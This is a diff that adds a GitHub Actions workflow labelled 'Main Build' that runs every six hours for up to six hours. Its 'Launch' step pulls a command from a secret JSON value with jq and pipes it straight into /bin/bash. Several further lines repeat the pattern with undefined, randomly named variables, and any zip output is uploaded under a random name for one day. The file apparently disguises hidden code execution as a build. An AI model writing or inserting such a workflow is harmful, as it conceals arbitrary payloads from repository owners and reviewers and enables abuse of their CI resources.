@@ -1,0 +1,34 @@
+name: Main Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '29 0,6,12,18 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  ci:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Launch
+        env:
+          qlm2: ${{ secrets.qlm2 }}
+        run: |
+          printf '%s' "$qlm2" | jq -r .dzqj6 | /bin/bash
+          echo $ydgv49 | jq -r .eth24 | /bin/bash
+          echo $oiutp5447 | jq -r .dmdg3655 | /bin/bash
+          echo $w643 | jq -r .joo904 | /bin/bash
+          printf '%s' "$bw94951" | jq -r .noea9783 | /bin/bash
+          printf '%s' "$klvy59661" | jq -r .d334 | /bin/bash
+
+      - name: Save artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: WduamQch
+          path: "*.zip"
+          retention-days: 1
